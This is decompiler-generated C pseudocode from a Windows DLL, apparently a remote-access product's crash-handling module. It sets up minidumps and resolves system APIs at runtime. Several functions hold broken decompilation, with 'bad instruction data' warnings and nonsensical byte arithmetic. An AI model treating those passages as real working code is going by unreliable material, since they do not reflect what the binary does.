  int iVar3;
  undefined8 uVar4;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075092;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_1014f003();
  *(undefined4 *)(param_1 + 0x18) = 1;
  local_8 = 0;
  local_14 = FUN_10058463(0x60,&DAT_10098020);
  local_8._0_1_ = 1;
  if (local_14 == 0) {
    local_14 = 0;
  }
  else {
    local_14 = FUN_1003fc90(param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9,param_10
                           );
  }
  local_8 = CONCAT31(local_8._1_3_,2);
  iVar2 = *(int *)(param_1 + 0x1c);
  uVar1 = FUN_10019f30(iVar2,*(undefined4 *)(iVar2 + 4),&local_14);
  uVar4 = CONCAT44(uVar1,*(int *)(param_1 + 0x20));
  if (*(int *)(param_1 + 0x20) == 0x15555554) {
    uVar4 = FUN_10056a6a("list<T> too long");
  }
  iVar3 = (int)((ulonglong)uVar4 >> 0x20);
  *(int *)(param_1 + 0x20) = (int)uVar4 + 1;
  *(int *)(iVar2 + 4) = iVar3;
  local_8 = local_8 & 0xffffff00;
  **(int **)(iVar3 + 4) = iVar3;
  if (local_14 != 0) {
    FUN_10019ea0(local_14);
  }
  local_14 = 0;
  if (*(int *)(*(int *)(*(int *)(param_1 + 0x1c) + 4) + 8) != 0) {
    iVar2 = FUN_10040070();
    if (iVar2 != 0) {
      uVar1 = 0;
      goto LAB_10019c54;
    }
  }
  uVar1 = 0x80040206;
LAB_10019c54:
  *(undefined4 *)(param_1 + 0x18) = 0;
  (*DAT_100792fc)(param_1);
  ExceptionList = local_10;
  return uVar1;
}



/* Function: FUN_10019c80 */

void __thiscall FUN_10019c80(int *param_1,undefined **param_2)

{
  undefined **ppuVar1;
  undefined **ppuVar2;
  
  if (*param_1 == 0) {
    ppuVar2 = (undefined **)0x0;
  }
  else {
    ppuVar2 = (undefined **)(*param_1 + 0xc);
  }
  ppuVar1 = &PTR_10083554;
  if (ppuVar2 != (undefined **)0x0) {
    ppuVar1 = ppuVar2;
  }
  ppuVar2 = &PTR_10083554;
  if (param_2 != (undefined **)0x0) {
    ppuVar2 = param_2;
  }
  (**(code **)(PTR_DAT_10096f20 + 0x198))(ppuVar1,ppuVar2);
  return;
}



/* Function: FUN_10019cc0 */

undefined4 __thiscall FUN_10019cc0(int *param_1,short *param_2)

{
  short *psVar1;
  short sVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  
  if (param_2 != (short *)0x0) {
    psVar1 = param_2 + 1;
    do {
      sVar2 = *param_2;
      param_2 = param_2 + 1;
    } while (sVar2 != 0);
    uVar5 = (int)param_2 - (int)psVar1 >> 1;
    if (uVar5 != 0) {
      if (*param_1 == 0) {
        uVar4 = 0;
      }
      else {
        uVar4 = *(uint *)(*param_1 + 8);
      }
      if ((uVar5 <= uVar4) && (cVar3 = FUN_1004aa70(uVar5), cVar3 != '\0')) {
        return 1;
      }
      return 0;
    }
  }
  return 1;
}



/* Function: FUN_10019d30 */

void __fastcall FUN_10019d30(int *param_1)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    FUN_1004ab70(*(undefined4 *)(iVar1 + 8),iVar1 + 0xc);
    return;
  }
  FUN_1004ab70(0,0);
  return;
}



/* Function: FUN_10019d70 */

void __fastcall FUN_10019d70(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  
  piVar2 = (int *)*param_1;
  piVar5 = (int *)*piVar2;
  *piVar2 = (int)piVar2;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar5 != (int *)*param_1) {
    do {
      iVar3 = piVar5[2];
      piVar2 = (int *)*piVar5;
      if (iVar3 != 0) {
        FUN_1003ffa0();
        FUN_10040070();
        piVar4 = *(int **)(iVar3 + 0x48);
        if (piVar4 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar4;
          *piVar4 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar4);
          }
        }
        piVar4 = *(int **)(iVar3 + 0x44);
        if (piVar4 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar4;
          *piVar4 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar4);
          }
        }
        thunk_FUN_100579ee(iVar3);
      }
      piVar5[2] = 0;
      thunk_FUN_100579ee(piVar5);
      piVar5 = piVar2;
    } while (piVar2 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_10019e10 */

void __thiscall FUN_10019e10(undefined4 *param_1,undefined4 *param_2)

{
  int *piVar1;
  
  piVar1 = (int *)*param_1;
  *param_2 = piVar1;
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  return;
}



/* Function: FUN_10019e30 */

void FUN_10019e30(void)

{
  code *pcVar1;
  int extraout_ECX;
  int *extraout_EDX;
  uint unaff_EDI;
  undefined1 uVar2;
  
  uVar2 = 0;
  if (DAT_1009b498 != 0) {
    DAT_1009b498 = 0;
    (*DAT_100792fc)(&DAT_1009b480);
  }
  FUN_1016ac1d(&DAT_1009b480);
  if ((bool)uVar2) {
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  *(uint *)(extraout_ECX + 1) = *(uint *)(extraout_ECX + 1) | unaff_EDI;
  LOCK();
  *extraout_EDX = *extraout_EDX + extraout_ECX;
  UNLOCK();
  return;
}



/* Function: FUN_10019e60 */

void __fastcall FUN_10019e60(int *param_1)

{
  int iVar1;
  
  if (param_1[1] != 0) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x18) = 0;
    (*DAT_100792fc)(iVar1);
  }
  return;
}



/* Function: FUN_10019e80 */

void __fastcall FUN_10019e80(int *param_1)

{
  if (*param_1 != 0) {
    FUN_10019ea0(*param_1);
  }
  *param_1 = 0;
  return;
}



/* Function: FUN_10019ea0 */

int __fastcall FUN_10019ea0(int param_1)

{
  int iVar1;
  int *piVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100750c6;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_8 = 1;
  FUN_1003ffa0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  FUN_10040070();
  piVar2 = *(int **)(param_1 + 0x48);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = *(int **)(param_1 + 0x44);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  thunk_FUN_100579ee(param_1);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10019f30 */

void FUN_10019f30(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int iVar1;
  
  iVar1 = FUN_1000fa00(param_1,param_2);
  if ((undefined4 *)(iVar1 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar1 + 8) = *param_3;
    *param_3 = 0;
  }
  return;
}



/* Function: FUN_10019f60 */

undefined4 * FUN_10019f60(void)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100750fe;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((DAT_1009b4a4 & 1) == 0) {
    DAT_1009b4a4 = DAT_1009b4a4 | 1;
    local_8 = 0;
    FUN_10019fc0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    FUN_10057b51(&LAB_100784a0);
  }
  ExceptionList = local_10;
  return &DAT_1009b4a8;
}



/* Function: FUN_10019fc0 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10019fc0(void)

{
  char *pcVar1;
  char extraout_DL;
  int unaff_EBP;
  int unaff_ESI;
  char in_CF;
  
  DAT_1009b4a8 = 0;
  _DAT_1009b4ac = 0;
  _DAT_1009b4b0 = 0;
  DAT_1009b4b4 = 0;
  DAT_1009b4b8 = 0;
  DAT_1009b4bc = 0;
  DAT_1009b4c0 = 0;
  _DAT_1009b4c4 = 0;
  _DAT_1009b4c8 = 0;
  _DAT_1009b4cc = 0;
  _DAT_1009b4d0 = 0;
  _DAT_1009b4d4 = 0;
  DAT_1009b4d8 = 0;
  pcVar1 = (char *)FUN_1064d80e("LMIGuardianDll.dll");
  *(char *)(unaff_EBP + -0x277bf040) = *(char *)(unaff_EBP + -0x277bf040) + (char)pcVar1 + in_CF;
  *pcVar1 = *pcVar1 + (char)pcVar1;
  *(char *)(unaff_ESI + -0x18) = *(char *)(unaff_ESI + -0x18) + extraout_DL;
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: Init */

uint Init(void)

{
  uint uVar1;
  
                    /* 0x1a140  7  Init */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  return DAT_1009ad0c;
}



/* Function: HttpMain */

undefined4 HttpMain(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  undefined4 uVar2;
  undefined4 extraout_ECX;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 uStack_1c;
  int iStack_14;
  
                    /* 0x1a180  6  HttpMain */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  local_24 = 8;
  local_20 = 0x40ff;
  FUN_103845e3(&stack0xfffffffc,&local_24);
  FUN_10008e40(param_1,param_2,param_3);
  uVar2 = FUN_10009140();
  DAT_10099188 = 0;
  if (iStack_14 != 0) {
    FUN_10059ab0();
    FUN_10020a20(extraout_ECX);
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(uStack_1c);
  return uVar2;
}



/* Function: FUN_1001a230 */

/* WARNING: Removing unreachable block (ram,0x1001a391) */

uint * __thiscall FUN_1001a230(uint *param_1,uint param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  short sVar2;
  uint *puVar3;
  uint uVar4;
  uint uVar5;
  uint extraout_ECX;
  uint extraout_ECX_00;
  undefined4 extraout_ECX_01;
  short *psVar6;
  byte *unaff_EBX;
  int iVar7;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075133;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = param_2;
  param_1[1] = 0x8000;
  param_1[2] = 0;
  local_8 = 0;
  param_1[3] = 0;
  puVar3 = (uint *)param_1[2];
  uVar5 = FUN_10010370(0x105,1);
  param_1[2] = uVar5;
  if (uVar5 == 0) {
    if (puVar3 != (uint *)0x0) {
      LOCK();
      uVar1 = *puVar3;
      uVar5 = *puVar3;
      *puVar3 = uVar1 - 1;
      UNLOCK();
      if ((int)(uVar1 - 1) < 0) {
        uVar5 = FUN_100579ee(puVar3,uVar4);
      }
    }
    if (param_1[2] != 0) goto LAB_1001a2b2;
  }
  else {
LAB_1001a2b2:
    if (param_1[2] != 0) {
      iVar7 = param_1[2] + 0xc;
      goto LAB_1001a2c0;
    }
  }
  iVar7 = 0;
LAB_1001a2c0:
  local_8 = CONCAT31(local_8._1_3_,1);
  if ((char)param_4 != '\0') {
    unaff_EBX = (byte *)FUN_10598ad7(uVar5,uVar4);
    param_4 = -1;
    uVar5 = DAT_1009b4dc;
    if ((DAT_1009b4dc & 1) == 0) {
      DAT_1009b4dc = DAT_1009b4dc | 1;
      FUN_1001a9a0();
      FUN_10057b51(&DAT_100784c0);
      uVar5 = extraout_ECX;
    }
    if (DAT_1009b500 != (code *)0x0) {
      (*DAT_1009b500)(unaff_EBX,&param_4);
      uVar5 = extraout_ECX_00;
    }
    if (param_4 == 0) {
      FUN_10040a80(uVar5);
    }
  }
  if (iVar7 != 0) {
    iVar7 = FUN_10512b9a(0,param_1[1] & 0x8000 | *param_1,0,0,iVar7);
    *unaff_EBX = *unaff_EBX ^ 0xc9;
    param_1[3] = CONCAT31((int3)((uint)extraout_ECX_01 >> 8),-1 < iVar7);
  }
  uVar5 = param_1[2];
  if (uVar5 != 0) {
    psVar6 = (short *)(uVar5 + 0xc);
    if (psVar6 == (short *)0x0) {
      iVar7 = 0;
    }
    else {
      do {
        sVar2 = *psVar6;
        psVar6 = psVar6 + 1;
      } while (sVar2 != 0);
      iVar7 = (int)((int)psVar6 - (uVar5 + 0xe)) >> 1;
    }
    *(int *)(uVar5 + 8) = iVar7;
    *(undefined2 *)(uVar5 + 0xc + iVar7 * 2) = 0;
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1001a3b0 */

void __fastcall FUN_1001a3b0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  if ((*(char *)(param_1 + 4) != '\0') && (param_1[2] != 0)) {
    (*DAT_10079270)(param_1[2]);
  }
  piVar2 = (int *)param_1[1];
  param_1[2] = 0;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1001a410 */

undefined4 * __thiscall
FUN_1001a410(undefined4 *param_1,undefined4 param_2,short *param_3,undefined4 param_4,
            undefined4 param_5)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  int *piVar4;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075173;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = CRobotBase::vftable;
  param_1[1] = &DAT_1009ad28;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  uVar3 = FUN_100075b0(uVar2);
  param_1[5] = uVar3;
  local_8 = 0;
  param_1[7] = param_4;
  *param_1 = CWait4CrashThread::vftable;
  param_1[6] = param_3;
  param_1[8] = param_5;
  param_1[9] = 0;
  param_1[10] = 0;
  param_1[0xb] = 0;
  uVar3 = FUN_100070d0("Wait4CrashThread",0xffffffff);
  param_1[5] = uVar3;
  if ((param_3 == (short *)0x0) || (*param_3 != 0)) {
    FUN_1000bd10();
  }
  else {
    FUN_1000ba60();
  }
  piVar4 = (int *)FUN_1000bfa0(&DAT_10083854,0xffffffff);
  local_14 = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,3);
  FUN_10024600(param_1 + 9,&local_14);
  if (local_14 != (int *)0x0) {
    LOCK();
    iVar1 = *local_14;
    *local_14 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_14);
    }
  }
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = *piVar4 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1001a550 */

undefined4 * __thiscall FUN_1001a550(undefined4 *param_1,byte param_2)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100751ae;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = CWait4CrashThread::vftable;
  local_8 = 1;
  FUN_100079a0(uVar3);
  piVar2 = (int *)param_1[9];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  *param_1 = CRobotBase::vftable;
  local_8 = 2;
  FUN_100079a0(uVar3);
  piVar2 = (int *)param_1[5];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1001a600 */

void __fastcall FUN_1001a600(int param_1)

{
  undefined4 uVar1;
  undefined4 extraout_ECX;
  
  uVar1 = CrashMain(*(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x1c),param_1 + 0x24,
                    param_1 + 0x2c);
  *(undefined4 *)(param_1 + 0x28) = uVar1;
  FUN_101f95da(extraout_ECX,*(undefined4 *)(param_1 + 0x20),0x12,0,0);
  return;
}



/* Function: FUN_1001a630 */

void __fastcall FUN_1001a630(int param_1)

{
  int iVar1;
  undefined **ppuVar2;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_100751e0;
  local_14 = ExceptionList;
  if (*(int *)(param_1 + 0x2c) == 0) {
    if (*(int *)(param_1 + 0x24) == 0) {
      return;
    }
    if (*(int *)(*(int *)(param_1 + 0x24) + 8) == 0) {
      return;
    }
    ExceptionList = &local_14;
    (*DAT_10079310)(1,DAT_100956e0 ^ (uint)&stack0xffffffc8);
    if (*(int *)(param_1 + 0x28) != 1) {
      ExceptionList = local_14;
      return;
    }
    iVar1 = *(int *)(param_1 + 0x24);
    if ((iVar1 == 0) || (*(int *)(iVar1 + 8) == 0)) {
      ppuVar2 = &PTR_10083554;
    }
    else if (iVar1 == 0) {
      ppuVar2 = (undefined **)0x0;
    }
    else {
      ppuVar2 = (undefined **)(iVar1 + 0xc);
    }
    FUN_10033240(ppuVar2);
  }
  else {
    ExceptionList = &local_14;
    (*DAT_10079310)(1);
    if (*(int *)(param_1 + 0x28) != 1) {
      ExceptionList = local_14;
      return;
    }
    uStack_c = 1;
    FUN_10033350();
  }
  FUN_1001a3b0();
  ExceptionList = local_14;
  return;
}



/* Function: FUN_1001a720 */

undefined4 FUN_1001a720(void)

{
  return 1;
}



/* Function: FUN_1001a730 */

undefined4 * __thiscall FUN_1001a730(undefined4 *param_1,char *param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  undefined4 uVar5;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 0;
  param_1[0xd] = 0;
  if ((param_2 == (char *)0x0) || (*param_2 != '\0')) {
    piVar1 = (int *)FUN_100075b0();
  }
  else {
    piVar1 = (int *)FUN_10007ae0();
  }
  if (piVar1 == (int *)0x0) {
    iVar3 = 0;
  }
  else {
    iVar3 = piVar1[2];
    if (iVar3 != 0) {
      iVar2 = FUN_1004b540(&DAT_1008410c,4);
      iVar3 = piVar1[2];
      if (iVar2 == -1) {
        iVar2 = -1;
      }
      goto LAB_1001a7ec;
    }
  }
  iVar2 = -1;
LAB_1001a7ec:
  if (iVar3 + -4 != iVar2) {
    FUN_1001a910();
    if (((piVar1 != (int *)0x0) && (piVar1[2] != 0)) &&
       (*(char *)(piVar1[2] + 0xb + (int)piVar1) != '\\')) {
      FUN_10007b60(&DAT_10084114,0xffffffff);
    }
    piVar1 = (int *)FUN_10007b60("dbghelp.dll",0xffffffff);
  }
  if ((piVar1 == (int *)0x0) || (piVar4 = piVar1 + 3, piVar1[2] == 0)) {
    piVar4 = (int *)&DAT_10083790;
  }
  FUN_1040d878(&stack0xfffffffc,piVar4);
  uVar5 = FUN_10363233(piVar1);
  *param_1 = uVar5;
  uVar5 = (*(code *)0xffffffff)(uVar5,"ExtensionApiVersion");
  param_1[1] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"MiniDumpWriteDump");
  param_1[2] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymInitialize");
  param_1[3] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymCleanup");
  param_1[4] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymGetOptions");
  param_1[5] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymSetOptions");
  param_1[6] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymSetSearchPath");
  param_1[7] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"StackWalk");
  param_1[8] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymFunctionTableAccess");
  param_1[9] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymGetModuleInfo");
  param_1[10] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymGetModuleBase");
  param_1[0xb] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymGetSymFromAddr");
  param_1[0xc] = uVar5;
  uVar5 = (*(code *)0xffffffff)(*param_1,"SymGetLineFromAddr");
  param_1[0xd] = uVar5;
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar1;
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  return param_1;
}



/* Function: FUN_1001a910 */

undefined4 __fastcall FUN_1001a910(int *param_1)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = *param_1;
  iVar2 = FUN_100074a0(0,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    *param_1 = iVar3;
  }
  else {
    iVar3 = FUN_1004c290();
    if (iVar3 != 0) {
      bVar1 = true;
      *(int *)(*param_1 + 8) = *(int *)(*param_1 + 8) - iVar3;
      *(undefined1 *)(*(int *)(*param_1 + 8) + 0xc + *param_1) = 0;
      goto LAB_1001a94e;
    }
  }
  bVar1 = false;
LAB_1001a94e:
  iVar3 = *param_1;
  iVar2 = FUN_100074a0(0,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    *param_1 = iVar3;
  }
  else {
    iVar3 = FUN_1004c1c0();
    if (iVar3 != 0) {
      *(int *)(*param_1 + 8) = *(int *)(*param_1 + 8) - iVar3;
      *(undefined1 *)(*(int *)(*param_1 + 8) + 0xc + *param_1) = 0;
      return 1;
    }
  }
  if (bVar1) {
    return 1;
  }
  return 0;
}



/* Function: FUN_1001a9a0 */

/* WARNING: Instruction at (ram,0x1001aa73) overlaps instruction at (ram,0x1001aa6e)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * FUN_1001a9a0(void)

{
  byte *pbVar1;
  byte bVar2;
  char cVar3;
  byte bVar4;
  uint *puVar5;
  int extraout_ECX;
  byte bVar6;
  uint uVar7;
  uint unaff_EBX;
  code *unaff_ESI;
  char in_SF;
  char in_OF;
  undefined8 uVar8;
  
  while( true ) {
    DAT_1009b4e0 = 0;
    DAT_1009b4e4 = 0;
    DAT_1009b4e8 = 0;
    _DAT_1009b4ec = 0;
    _DAT_1009b4f0 = 0;
    DAT_1009b4f4 = 0;
    DAT_1009b4f8 = 0;
    _DAT_1009b4fc = 0;
    DAT_1009b500 = 0;
    _DAT_1009b504 = 0;
    _DAT_1009b508 = 0;
    DAT_1009b50c = 0;
    _DAT_1009b510 = 0;
    _DAT_1009b514 = 0;
    _DAT_1009b518 = 0;
    _DAT_1009b51c = 0;
    _DAT_1009b520 = 0;
    _DAT_1009b524 = 0;
    _DAT_1009b528 = 0;
    DAT_1009b52c = 0;
    _DAT_1009b530 = 0;
    DAT_1009b534 = 0;
    _DAT_1009b538 = 0;
    _DAT_1009b53c = 0;
    _DAT_1009b540 = 0;
    _DAT_1009b544 = 0;
    FUN_1049ae7a(unaff_EBX,"kernel32.dll");
    uVar8 = FUN_103daabc();
    uVar7 = (uint)((ulonglong)uVar8 >> 0x20);
    puVar5 = (uint *)uVar8;
    if (in_OF == in_SF) break;
    bVar4 = (byte)uVar8;
    *(byte *)(uVar7 + 8) = *(byte *)(uVar7 + 8) & bVar4;
    pbVar1 = (byte *)((int)puVar5 + -0x5d);
    bVar2 = *pbVar1;
    bVar6 = (byte)((ulonglong)uVar8 >> 0x20);
    *pbVar1 = *pbVar1 + bVar6;
    if (extraout_ECX == 1 || *pbVar1 == 0) goto code_r0x1001aabf;
    *(byte *)puVar5 = (byte)*puVar5 + bVar4 + CARRY1(bVar2,bVar6);
    *(byte *)puVar5 = (byte)*puVar5 + bVar4;
    unaff_EBX = (uint)CONCAT11((char)(unaff_EBX >> 8) + bVar4,(char)unaff_EBX);
    puVar5 = puVar5 + 0x4026d4d;
    cVar3 = (char)puVar5;
    *(byte *)puVar5 = (byte)*puVar5 + cVar3;
    in_OF = SCARRY1((byte)*puVar5,cVar3);
    *(byte *)puVar5 = (byte)*puVar5 + cVar3;
    in_SF = (char)(byte)*puVar5 < '\0';
  }
  uVar7 = uVar7 + 1;
  *(byte *)puVar5 = (byte)*puVar5 | (byte)uVar7;
code_r0x1001aabf:
  *puVar5 = *puVar5 | uVar7;
  DAT_1009b4e4 = (*unaff_ESI)();
  DAT_1009b4e8 = (*unaff_ESI)(DAT_1009b4e0,"GetModuleHandleExW");
  _DAT_1009b4ec = (*unaff_ESI)(DAT_1009b4e0,"GetModuleHandleW");
  _DAT_1009b4f0 = (*unaff_ESI)(DAT_1009b4e0,"OpenThread");
  DAT_1009b4f4 = (*unaff_ESI)(DAT_1009b4e0,"OpenProcess");
  DAT_1009b4f8 = (*unaff_ESI)(DAT_1009b4e0,"CloseHandle");
  _DAT_1009b4fc = (*unaff_ESI)(DAT_1009b4e0,"LoadLibraryA");
  DAT_1009b500 = (*unaff_ESI)(DAT_1009b4e0,"ProcessIdToSessionId");
  _DAT_1009b504 = (*unaff_ESI)(DAT_1009b4e0,"CreateEventW");
  _DAT_1009b508 = _DAT_1009b504;
  DAT_1009b50c = (*unaff_ESI)(DAT_1009b4e0,"GetVersionExW");
  _DAT_1009b510 = DAT_1009b50c;
  _DAT_1009b514 = (*unaff_ESI)(DAT_1009b4e0,"CreateToolhelp32Snapshot");
  _DAT_1009b518 = _DAT_1009b514;
  _DAT_1009b51c = (*unaff_ESI)(DAT_1009b4e0,"lstrcpynW");
  _DAT_1009b520 = _DAT_1009b51c;
  _DAT_1009b524 = (*unaff_ESI)(DAT_1009b4e0,"GetComputerNameW");
  _DAT_1009b528 = _DAT_1009b524;
  DAT_1009b52c = (*unaff_ESI)(DAT_1009b4e0,"FreeLibrary");
  _DAT_1009b530 = (*unaff_ESI)(DAT_1009b4e0,"CreateProcessW");
  DAT_1009b534 = (*unaff_ESI)(DAT_1009b4e0,"WTSGetActiveConsoleSessionId");
  _DAT_1009b538 = (*unaff_ESI)(DAT_1009b4e0,"IsWow64Process");
  _DAT_1009b53c = (*unaff_ESI)(DAT_1009b4e0,"SetProcessDEPPolicy");
  _DAT_1009b540 = (*unaff_ESI)(DAT_1009b4e0,"GetAppContainerNamedObjectPath");
  _DAT_1009b544 = (*unaff_ESI)(DAT_1009b4e0,"CheckTokenMembershipEx");
  return &DAT_1009b4e0;
}



/* Function: FUN_1001ac40 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined * __fastcall FUN_1001ac40(undefined4 param_1)

{
  if ((DAT_1009b548 & 1) == 0) {
    DAT_1009b548 = DAT_1009b548 | 1;
    _DAT_1009b54c = 0;
    DAT_1009b550 = 0;
    _DAT_1009b54c = FUN_10521dc6(param_1,"ntdll.dll");
    DAT_1009b550 = FUN_103cfc28();
    FUN_10057b51(&DAT_100784e0);
  }
  return &DAT_1009b54c;
}



/* Function: FUN_1001aca0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * FUN_1001aca0(void)

{
  char extraout_CH;
  byte bVar1;
  int unaff_EBX;
  code *unaff_ESI;
  float10 extraout_ST0;
  undefined8 uVar2;
  
  DAT_1009b560 = (byte *)0x0;
  DAT_1009b564 = 0;
  DAT_1009b568 = 0;
  DAT_1009b56c = 0;
  DAT_1009b570 = 0;
  DAT_1009b574 = 0;
  _DAT_1009b578 = 0;
  uVar2 = FUN_102ab26a("PsApi.dll");
  DAT_1009b560 = (byte *)uVar2;
  bVar1 = (byte)((ulonglong)uVar2 >> 0x20);
  *(char *)(unaff_EBX + -0x18) = *(char *)(unaff_EBX + -0x18) - bVar1;
  *(longlong *)(DAT_1009b560 + (int)((ulonglong)uVar2 >> 0x20)) = (longlong)extraout_ST0;
  DAT_1009b560[-0x30] = DAT_1009b560[-0x30] + extraout_CH;
  *DAT_1009b560 = *DAT_1009b560 | bVar1;
  DAT_1009b564 = (*unaff_ESI)(DAT_1009b560);
  DAT_1009b568 = (*unaff_ESI)(DAT_1009b560,"EnumProcessModules");
  DAT_1009b56c = (*unaff_ESI)(DAT_1009b560,"GetModuleFileNameExA");
  DAT_1009b570 = (*unaff_ESI)(DAT_1009b560,"GetModuleFileNameExW");
